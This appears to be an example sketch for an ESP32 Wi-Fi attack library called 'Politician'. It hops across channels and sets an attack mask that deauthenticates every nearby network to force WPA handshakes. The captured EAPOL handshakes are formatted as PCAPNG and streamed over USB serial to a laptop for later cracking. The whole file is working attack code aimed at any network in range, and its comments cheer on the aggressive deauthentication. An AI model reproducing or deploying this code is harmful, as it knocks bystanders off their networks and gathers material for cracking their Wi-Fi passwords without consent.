// ==============================================================================
// 📡 POLITICIAN: Native PCAPNG Serial Streamer
// ==============================================================================
// Instead of saving high-speed Beacons or Handshakes to an SD Card (which has 
// massive blocking delays and write limitations), this script instantly formats
// the raw packets mathematically into perfectly valid PCAPNG (EPB) binary blocks 
// and streams them straight over the USB UART cable to a listening Python script
// running on your laptop!
// ==============================================================================

#include <Arduino.h>
#include "Politician.h"
#include "PoliticianFormat.h"

using namespace politician;
using namespace politician::format;

Politician engine;

// Pre-allocate a large static buffer so we NEVER use standard heap memory during the interrupt
uint8_t pcapBuffer[4096];

void setup() {
    // 💳 Set incredibly high baud rate to support maximum Wi-Fi throughput.
    // Ensure your python listener specifically dials in at 921600!
    Serial.begin(921600);
    delay(2000); 

    // When the Python script connects via Serial, we MUST inject the mathematical 
    // headers that define exactly what format the upcoming binary stream is in.
    // 1 & 2. Send the PCAPNG Section Header Block (SHB) + Interface Description Block (IDB)
    size_t header_len = writePcapngGlobalHeader(pcapBuffer);
    Serial.write(pcapBuffer, header_len);

    // Ensure the hardware pushes the headers out immediately
    Serial.flush(); 

    Config cfg;
    // We want to pull Handshakes dynamically, so we hop at standard speeds
    cfg.capture_filter = LOG_FILTER_HANDSHAKES; 
    cfg.hop_dwell_ms   = 200; 
    engine.begin(cfg);
    
    // Deauth every network we see to aggressively generate handshakes!
    engine.setAttackMask(ATTACK_ALL);
    engine.startHopping();

    // 3. Hook the PCAPNG Native Formatter Callback
    engine.setEapolCallback([](const HandshakeRecord &rec) {
        // This fires natively on Core 0 whenever an EAPOL packet is cracked.
        // Convert the record into a 100% compliant Wireshark EPB Binary array!
        size_t block_len = writePcapngRecord(rec, pcapBuffer, sizeof(pcapBuffer));
        
        // Blast the raw array instantly over the wire to your computer!
        if (block_len > 0) {
            Serial.write(pcapBuffer, block_len);
            Serial.flush(); // Ensure delivery before resuming the attack loop
        }
    });
}

void loop() {
    engine.tick();
}
